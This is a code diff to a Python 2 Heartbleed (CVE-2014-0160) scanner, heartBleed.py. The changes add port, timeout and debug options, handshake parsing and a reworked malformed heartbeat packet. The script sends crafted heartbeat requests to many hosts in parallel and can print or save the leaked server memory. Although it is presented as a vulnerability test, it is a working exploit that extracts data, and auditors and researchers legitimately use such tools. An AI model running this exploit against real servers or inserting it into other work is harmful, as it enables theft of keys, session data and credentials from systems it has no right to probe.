@@ -2,21 +2,23 @@
 #     File Name           :     heartBleed.py
 #     Created By          :     Jone Casper(xu.chenhui@live.com)
 #     Creation Date       :     [2014-04-14 12:57]
-#     Last Modified       :     [2014-04-14 22:17]
+#     Last Modified       :     [2014-04-20 12:57]
 #     Description         :     Test for SSL heartbleed vulnerability
 #################################################################################
 #!/usr/bin/env python
 
 
-import sys, socket, ssl, time, select
-from _ssl import PROTOCOL_TLSv1
+import sys, socket, time, select, logging
 import struct 
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
 
+def bin2h(x):
+    return  " ".join("{:02x}".format(ord(c)) for c in x)
+
 #Thanks for https://github.com/musalbas/heartbleed-masstest
 hello = h2bin('''
-16 03 03 00 dc 01 00 00  d8 03 02 53
+16 03 03 00 dc 01 00 00  d8 03 03 53
 43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
 bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
 00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
@@ -32,8 +34,10 @@ c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
 00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
 00 0f 00 01 01                                  
 ''')
-hbpkt = h2bin("01 4e 20") + "\x01"*20000
-hb = h2bin("18 03 03 40 00") + hbpkt[0:16384] + h2bin("18 03 03 0e 23") + hbpkt[16384:]
+#hbpkt = h2bin("01 4e 20") + "\x01"*20000
+#hb = h2bin("18 03 03 40 00") + hbpkt[0:16384] + h2bin("18 03 03 0e 23") + hbpkt[16384:]
+
+hb  = h2bin("18 03 03 40 00 01 3f fd") + "\x01"*16381 + h2bin("18 03 03 00 03 01 00 00")
 
 class heartBleed:
 
@@ -45,22 +49,29 @@ class heartBleed:
     _error = None
     _connumber = 0
 
-    def __init__(self, domain, acode = None, epoll=None):
+    def __init__(self, domain, port=443, acode=None, conn_timeout=10, epoll=None, loggerLevel=logging.WARNING):
         self.domain = domain
+        self.port = port
         self.connected = False
         if epoll is not None:
             self._epoll = epoll
         else:
             self._epoll = select.epoll()
             self._releaseEpoll = True
+        self.conn_timeout = conn_timeout
         self.hb = acode if acode is not None else hb 
-        
+
+        #Logger
+        self.logger = logging.getLogger('heartbleed_tester')
+        self.logger.setLevel(loggerLevel)
+        hd = logging.StreamHandler()
+        self.logger.addHandler(hd)
+
     def _initsock(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(5) 
         try:
-            #ssl_socket = ssl.wrap_socket(s, ssl_version=PROTOCOL_TLSv1)
-            s.connect((self.domain, 443))
+            s.connect((self.domain, self.port))
         except Exception,e:
             self._error = "Connect failed! " + str(e)
             s = None
@@ -107,16 +118,25 @@ class heartBleed:
                 break;
         return _data
 
-    def recvSSLMsg(self, timeout=5):
+    def recvSSLMsg(self):
         sock = self.connsocket
+        self.logger.debug("Response:------------------")
         
-        msg = self._recvall(sock, l=5, timeout=timeout)
+        msg = self._recvall(sock, l=5, timeout=self.conn_timeout)
+        self.logger.debug("Recv Header:" + bin2h(msg))
         
         type, ver, ln = self._getSSLHeader(msg)
         if ln is None:
             return None,None,None,None
+        self.logger.debug("   type:" + hex(type))
+        self.logger.debug("   version:" + hex(ver))
+        self.logger.debug("   length:" + hex(ln))
+   
 
-        pay = self._recvall(sock, l=ln, timeout=timeout)
+        pay = self._recvall(sock, l=ln, timeout=self.conn_timeout)
+        self.logger.debug("Recv Payload:" + bin2h(pay))
+        self.logger.debug("---------------------------")
+        
         return type, ver, ln, pay
 
     def unpackHeartBeat(self, pay):
@@ -138,6 +158,26 @@ class heartBleed:
             return msg[5:5+ln]
         return None
 
+    def unpack_handshake(self, pay):
+        """
+        Unpack the SSL handshake in Multiple Handshake Message 
+        """
+        paylen = len(pay)
+        offset = 0
+        payarr = []
+
+        while offset < paylen:
+            h = pay[offset:offset + 4]
+            t, l24 = struct.unpack('>B3s', h)
+            l = struct.unpack('>I', '\x00' + l24)[0] 
+            payarr.append((
+                t,
+                l,
+                pay[offset+4:offset+4+l]
+            ))
+            offset = offset+l+4
+        return payarr
+
     @property
     def connsocket(self):
         if self._connsock is None:
@@ -145,7 +185,11 @@ class heartBleed:
         return self._connsock
 
     def _test(self, sock):
+        self.logger.debug("Send:------------------")
         sock.send(self.hb)
+        self.logger.debug(bin2h(self.hb))
+        self.logger.debug("-----------------------")
+
         type, ver, ln, pay = self.recvSSLMsg()
 
         is_vulnerable = False
@@ -176,9 +220,14 @@ class heartBleed:
             if type is None:
                 self._error = "SSL connect failed!"
                 return False
-            self.hb = self.hb[:2] + chr(ver&0xff) + self.hb[3:]
-            if type == 22 and ord(pay[0]) == 0x0E:
-                break
+
+            self.hb = self.hb[:2] + chr(ver&0xff) + self.hb[3:16391] + chr(ver&0xff) + self.hb[16392:]
+            if type == 22:
+                payarr = self.unpack_handshake(pay)
+                # Look for server hello done message.
+                finddone = [t for t, l, p in payarr if t == 14]
+                if len(finddone) > 0:
+                    break
        
         is_vulnerable = self._test(sock)              
         self._colsesock()
@@ -197,9 +246,12 @@ if __name__ == "__main__":
     from optparse import OptionParser
     import os.path
     options = OptionParser(usage='%prog <network> [network2] [network3] ...', description='Test for SSL heartbleed vulnerability (CVE-2014-0160)')
+    options.add_option('-p', dest="port", default=443 ,type="int", help="SSL connect port.")
+    options.add_option('-t', dest="timeout", default=10,type="int", help="SSL connect timeout.")
     options.add_option('-o', dest="outpay", action="store_true", help="Output the data when the server is vulnerable.")
     options.add_option('-f', dest="outtofile", help="Output the data to a file when the server is vulnerable.")
     options.add_option('--threads', dest="threads", default=100, help="Thread number, defaut is 5.")
+    options.add_option('--debug', dest="debug", action="store_true", help="Debug Model.")
     opts, args = options.parse_args()
 
     if not args:
@@ -210,7 +262,9 @@ if __name__ == "__main__":
     
     epoll = select.epoll()
     def scan(host):
-        test = heartBleed(host, epoll=epoll)
+        test = heartBleed(host, epoll=epoll, conn_timeout=opts.timeout, port=opts.port)
+        if opts.debug:
+            test.logger.setLevel(logging.DEBUG)
         res = test._run()
         if res:
             print "The domain " + test.domain + " is vulnerable!"
